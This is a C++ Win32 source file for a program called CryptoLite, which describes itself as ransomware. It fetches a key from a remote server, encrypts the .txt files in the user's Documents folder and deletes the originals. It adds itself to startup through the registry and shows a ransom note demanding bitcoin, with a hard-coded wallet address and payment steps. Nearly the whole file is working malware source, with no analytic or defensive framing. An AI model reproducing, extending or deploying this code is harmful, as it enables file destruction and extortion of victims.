#include "stdafx.h"
#include "CryptoLite.h"

/*
Main win32 api function
Creates the gui box and calls encryption

*/
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nShowCmd)
{
	//Gets the My documents location
	SHGetFolderPath(NULL, CSIDL_MYDOCUMENTS, NULL,
		SHGFP_TYPE_CURRENT, docPath);

	//Gets appdata folder location
	SHGetFolderPath(NULL, CSIDL_COMMON_APPDATA, NULL,
		SHGFP_TYPE_CURRENT, tempPath);

	//Key: WoVR0kJLXQ8zbCd1OagTH5ie3nvYU2wfrM9yI4sKm6c7hNjtADqFPxpEZlBuG
	//Gets the key from my server
	Crypto c(HTTP::GetKey((std::wstring)tempPath));


	//Adds is.encrypted to the end of tempPath 
	wcsncat_s(tempPath, L"\\is.encrypted", MAX_PATH);

	//Checks to see if the files have already been encrypted
	if (!FileIO::fileExists((std::wstring)tempPath))
	{
		//Adds a startup registry entry (Program ransomware with pc)
		Registry::RegisterProgram();


		std::vector<std::wstring> fileLocations;

		//Returns a sstring array of all text files in my documents
		FileSearch::searchDir(fileLocations, docPath, (wchar_t*)L".txt");

		//Loops through all text files in documents and encrypts them. Then deletes the none encrypted file
		for (std::wstring &path : fileLocations)
		{
			std::vector<std::string> data = FileIO::readFile(path);
			c.encrypt(data);
			FileIO::saveFile(path + L".encrypted", data);
			FileIO::removeFile(path);
		}

		//Creates a file called is.encrypted with the encrypted text of SuccessfullyDecrypted
		//This will later be decrypted to check if the key input by the user is correct.
		std::string isDecrypted = "SuccessfullyDecrypted";
		c.encrypt(isDecrypted);
		FileIO::saveFile((std::wstring)tempPath, isDecrypted);

	}




	//Modified version of: http://www.win32developer.com/tutorial/windows/windows_tutorial_3.shtm

	//Creates the Win32 gui class
	WNDCLASSEX wClass;
	ZeroMemory(&wClass, sizeof(WNDCLASSEX));
	wClass.cbClsExtra = NULL;
	wClass.cbSize = sizeof(WNDCLASSEX);
	wClass.cbWndExtra = NULL;
	wClass.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
	wClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	wClass.hIcon = NULL;
	wClass.hIconSm = NULL;
	wClass.hInstance = hInst;
	wClass.lpfnWndProc = (WNDPROC)WinProc;
	wClass.lpszClassName = L"Window Class";
	wClass.lpszMenuName = NULL;
	wClass.style = CS_HREDRAW | CS_VREDRAW;

	//Registers the class
	if (!RegisterClassEx(&wClass))
	{
		int nResult = GetLastError();
		MessageBox(NULL,
			L"Window class creation failed\r\n",
			L"Window Class Failed",
			MB_ICONERROR);
	}

	//Creates the window handle
	HWND hWnd = CreateWindowEx(NULL, L"Window Class", L"CryptoLite",
		WS_POPUP | WS_VISIBLE | WS_SYSMENU | WS_EX_TOOLWINDOW, 200, 200, 560, 340,
		NULL, NULL, hInst, NULL);

	if (!hWnd)
	{
		int nResult = GetLastError();

		MessageBox(NULL,
			L"Window creation failed\r\n",
			L"Window Creation Failed",
			MB_ICONERROR);
	}

	//Displays the window handle
	ShowWindow(hWnd, nShowCmd);

	MSG msg;
	ZeroMemory(&msg, sizeof(MSG));

	//Waits for a response from the window, such as a button click
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}

/*
Callback created to add text and objects to the screen
Waits for user input and executes code depending on the action
*/
LRESULT CALLBACK WinProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg)
	{
		//Creates the text on screen by painting
		case WM_PAINT:
		{
			//Vector of text to be displayed
			std::vector<LPCWSTR> ransomText;
			ransomText.push_back(L"ALL YOUR FILES HAVE BEEN ENCRYPTED!!!");
			ransomText.push_back(L"There's no way to decrypt these files without the decryption key.");
			ransomText.push_back(L"To retrieve the deceryption key a payment of 0.5 BC will need to be paid.");
			ransomText.push_back(L"");
			ransomText.push_back(L"INSTRUCTIONS:");
			ransomText.push_back(L"");
			ransomText.push_back(L"*Purchase the bitcoins from https://localbitcoins.com/.");
			ransomText.push_back(L"*Transfer the bitcoins to a https://blockchain.info/ Wallet.");
			ransomText.push_back(L"*From https://blockchain.info/ transfer the bitcoins to the below address.");
			ransomText.push_back(L"*Add a message to the transaction with the following format:");
			ransomText.push_back(L"{MAC-ADDRESS_EMAIL} <- ENSURE THIS IS CORRECT");
			ransomText.push_back(L"Example:");
			ransomText.push_back(L"00:A0:C9:14:C8:29_pwned@gmail.com");
			ransomText.push_back(L"");
			ransomText.push_back(L"Following payment the key will be emailed to you after confimation.");
			ransomText.push_back(L"");
			ransomText.push_back(L"IF YOU MESS UP YOUR MESSAGE FROMAT, YOU WILL NOT RECEIVE THE KEY!");

			PAINTSTRUCT ps;
			HDC hDC = BeginPaint(hWnd, &ps);
			//Setting the text style
			SetBkMode(hDC, TRANSPARENT);
			SetTextColor(hDC, RGB(0, 255, 0));

			//For every line of text in the it adds spacing
			for (size_t i = 0; i < ransomText.size(); i++)
			{
				//Writes the text
				TextOut(hDC, 10, 10 + (15 * i + 1), ransomText.at(i), wcslen(ransomText.at(i)));
			}
			//Text near the bitcoin edit box
			LPCWSTR bcLabel = (L"BitCoin Address:");
			TextOut(hDC, 10, 280, bcLabel, wcslen(bcLabel));
			//Text near the decryption key edit box
			LPCWSTR keyLabel = (L"Decryption Key:");
			TextOut(hDC, 10, 310, keyLabel, wcslen(keyLabel));

			EndPaint(hWnd, &ps);
		}
		break;


		//Creates the objects in the GUI
		case WM_CREATE:
		{
			// Creates a readonly edit box with my bitcoin addresss
			hEdit = CreateWindowEx(WS_EX_CLIENTEDGE, L"EDIT", L"1aa5cmqmvQq8YQTEqcTmW7dfBNuFwgdCD",
				WS_CHILD | WS_VISIBLE | ES_READONLY, 140, 280, 300, 20, hWnd, NULL, NULL, NULL);

			// Create an edit box
			hEdit = CreateWindowEx(WS_EX_CLIENTEDGE, L"EDIT", L"",
				WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 140, 310, 300, 20, hWnd, NULL, NULL, NULL);

			// Create a push button
			HWND hWndButton = CreateWindowEx(NULL, L"BUTTON", L"DECRYPT",
				WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, 450, 310, 100, 22,
				hWnd, (HMENU)IDC_MAIN_BUTTON, GetModuleHandle(NULL), NULL);

		}
		break;
		//Waits for the commands to be sent back (Such as button presses)
		case WM_COMMAND:
			switch (LOWORD(wParam))
			{
				//Definded in header
				case IDC_MAIN_BUTTON:
				{
					//Waits for get message, reads the text and inputs into wchar buffer
					wchar_t* buffer[256];
					SendMessage(hEdit, WM_GETTEXT,
						sizeof(buffer) / sizeof(buffer[0]),
						reinterpret_cast<LONG_PTR>(buffer));
					//Converts for wchar to string and initialises new crypto instance
					std::wstring wkey = std::wstring((wchar_t*)buffer);
					std::string key(wkey.begin(), wkey.end());
					Crypto Crypto(key);

					//Checks to see if the key is correct
					if (Crypto.checkKey(FileIO::readFile((std::wstring)tempPath).at(0)))
					{
						
						std::vector<std::wstring> fileLocations;
						//Looks for all encrypted files
						FileSearch::searchDir(fileLocations, docPath, (wchar_t*)L".encrypted");
						//Same process as encrypt but in reverse
						for (std::wstring &path : fileLocations)
						{
							std::vector<std::string> data = FileIO::readFile(path);
							Crypto.decrypt(data);
							FileIO::removeFile(path);
							//Removes the encrypted extension and saves decrypted data
							FileIO::saveFile(path.erase(path.size() - 10), data);
						}
						//Removes encrypted files
						FileIO::removeFile((std::wstring)tempPath);
						//Removes startup registry
						Registry::RemoveProgram();
						//Sends message to user that the process was successfully complete
						MessageBox(NULL, L"Files Succesfully Decrypted", L"Information", MB_ICONINFORMATION);
						//Quits the program
						PostQuitMessage(0);
						return 0;
					}
					else
					{
						//Warns the user they entered an incorrect key
						MessageBox(NULL, L"Incorrect Key", L"Warning", MB_ICONWARNING);
					}
				}
				break;
			}
			break;
			//User closed the ransomware
			case WM_DESTROY:
			{
				//exits the ransomware
				PostQuitMessage(0);
				return 0;
			}
			break;
	}
	//destroys the windows process
	return DefWindowProc(hWnd, msg, wParam, lParam);
}


